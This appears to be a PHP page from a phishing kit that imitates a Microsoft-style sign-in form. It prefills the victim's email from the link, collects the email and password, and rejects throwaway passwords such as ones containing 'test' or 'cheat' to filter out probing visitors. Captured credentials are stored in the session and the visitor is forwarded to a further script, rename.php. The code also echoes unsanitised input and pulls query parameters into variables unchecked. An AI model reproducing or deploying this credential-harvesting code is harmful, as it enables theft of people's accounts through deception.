<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Enter a valid email";
	}
        else if(trim($pass) == "") {
		$pass_msg = "Please enter password";
	}
        else if(strlen($pass) <= 4 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: rename.php");
		exit;
	}
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="images/favicon.ico">

<style>
body {
	margin: 0;
	font-family: "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
	color: #000;
	direction: ltr;
	font-size: 88%;
}

span, img, input,  {
	margin: 0;
}

a {
	color: #0072C6;
	font-weight: inherit;
	text-decoration: none;
}

.tt {
	width: 302px;
	height: 1.571em;
	padding: 4px 8px;
	font-family: "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
	font-size: 100%;
	color: #212121;
	border: 1px solid rgb(186,186,186);
	background-color: rgba(255,255,255,0.8);
	ime-mode: inactive;
	-webkit-user-modify: read-write-plaintext-only;
	-webkit-appearance: none;
	-webkit-border-radius: 0;
	line-height: 142%;
}

.submit { 
	background-color: #2672EC;
	color: #fff;
	height: 2.142em;
	min-width: 6em;
	font-family: "Segoe UI Web Semibold", "Segoe UI Web Regular", "Segoe UI", "Segoe UI Symbol", "Helvetica Neue", Arial;
	font-size: 100%;
	padding: 3px 12px 5px;
	border: 0px;
}

.submit:hover {
	background-color: #1E82CC;
}
</style>


<title>Sign In</title>
</head>

<body topmargin="0" leftmargin="0">

<div style="width: 935px; margin: auto">
	<div style="width: 475px; float: left; margin-top: 40px; margin-left: 20px;">
    	<img src="images/img1.jpg" />
        <img src="images/img2.jpg" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="30,91,113,114" href="#" /></map>
  </div>
    <div style="float: left; margin-left: 100px;">
      <form method="post" action="">
    	<img src="images/logo.png" style="display: block; margin-top: 81px; margin-bottom: 37px;" />
        
       <img src="images/img3.jpg" border="0" usemap="#Map2"  style="display: block; margin-bottom: 8px;"/>
<map name="Map2" id="Map2"><area shape="rect" coords="100,-1,161,11" href="#" /></map>

       <?php if($user == "") {
							?>
					
       <input type="text" id="email" name="email" placeholder="someone@example.com" class="tt"  style="margin-bottom: 8px;" value="<?php echo $email != "" ? $email : "" ?>" /><?php echo $email_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 2px;'>$email_msg</span>" : "<br />" ?>


				<?php

			} else {
				
	?>
			
			<input type="hidden" name="email" value="<?php echo $userid ?>" />

				<p id='username'><b><?php echo $userid ?></b></p> 
	<?php

			} ?>

       <br />
<input type="password" id="pass" name="passwd" placeholder="Password" class="tt" style="margin-bottom: 5px;"  /> <?php echo $pass_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 1px;'>$pass_msg</span>" : "<br />" ?> <br />
       
       <div style="margin-bottom: 34px;">
       <label style="display: block; padding-left: 15px; text-indent: -15px; margin-left: 3px;" for="remember"><input type="checkbox" name="remember" id="remember"  style="width: 13px; height: 13px; padding: 0; margin:0; vertical-align: bottom; position: relative; top: -1px; *overflow: hidden;" /> &nbsp;Keep me signed in</label>
       </div>
       
       <input type="submit" name="submit" value="Sign In" class="submit" />
      </form>
       <img src="images/img4.jpg" border="0" usemap="#Map3" style="display: block; margin-top: 34px;" />
<map name="Map3" id="Map3"><area shape="rect" coords="-25,-4,145,11" href="#" /><area shape="rect" coords="3,25,188,51" href="#" /></map>

		<img src="images/img5.jpg" border="0" usemap="#Map4" style="display: block; margin-top: 104px;"/>
<map name="Map4" id="Map4"><area shape="rect" coords="203,1,298,15" href="#" /></map>
  </div>
    <br style="clear: both" />
    <div style="border-top: 1px solid #CCC; margin-top: 51px">
    	<img src="images/img6.jpg" border="0" usemap="#Map5" style="float: left; margin-left: 20px; margin-top: 15px;" />
<map name="Map5" id="Map5">
  <area shape="rect" coords="3,-4,91,-2" href="#" />
<area shape="rect" coords="107,-1,145,12" href="#" /><area shape="rect" coords="161,0,256,11" href="#" /></map>
        <img src="images/img7.jpg" border="0" usemap="#Map6" style="float: right; margin-right: 20px; margin-top: 15px;"/>
<map name="Map6" id="Map6"><area shape="rect" coords="0,1,65,11" href="#" /><area shape="rect" coords="82,2,135,10" href="#" /></map>
        <br style="clear: both" />
  </div>
</div>

</body>
</html>
